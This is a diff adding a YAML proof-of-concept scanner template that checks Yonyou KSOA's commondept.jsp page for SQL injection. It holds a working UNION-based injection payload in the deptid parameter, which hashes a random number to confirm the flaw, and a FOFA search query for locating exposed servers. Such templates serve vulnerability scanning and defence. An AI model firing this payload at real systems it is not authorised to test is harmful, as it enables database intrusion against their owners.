@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-ksoa-common-deptjsp-sqli
+info:
+  name: 用友时空KSOA commondept.jsp SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  num: random_int(10000,99999)
+  code: md5(num)
+requests:
+- method: GET
+  path: /common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'{{.num}}'))--+
+  expression: 'status_code == 200 &&
+
+    contains(body,code) &&
+
+    contains(headers,"text/html")
+
+    '
+transport: http
